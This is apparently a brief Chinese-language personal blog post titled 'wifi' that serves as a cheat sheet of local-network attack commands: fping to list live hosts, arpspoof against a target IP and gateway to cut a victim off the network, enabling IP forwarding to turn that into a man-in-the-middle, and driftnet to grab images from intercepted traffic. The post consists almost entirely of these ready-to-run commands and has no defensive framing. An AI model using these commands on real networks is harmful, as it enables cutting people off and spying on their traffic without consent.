---
title: wifi
date: 2017-03-22 17:04:20
categories: [Security]
tags: [Security]
---
wifi
<!-- more -->
<h3>查看局域网内所有的ip</h3>
```bash
fping -asg 192.168.0.1/24
```
例出局域网中存活的主机
```bash
fping -asg 192.168.0.1/24 2>dev/null
```

<h3>arp断网</h3>
```bash
arpspoof -i 网卡 -t 目标ip 网关
```
```bash
arpspoof -i eth0 -t 192.168.0.151 192.168.0.1
```
从网关出去
```bash
echo 1 >/proc/sys/net/ipv4/ip_forward
```

<h3>获取本机网卡的图片信息</h3>
```bash
driftnet -i eth0
```




<!--<img src="/images/6.png" width="800" height="263" />-->
<!--<font color=#FF6666></font>-->
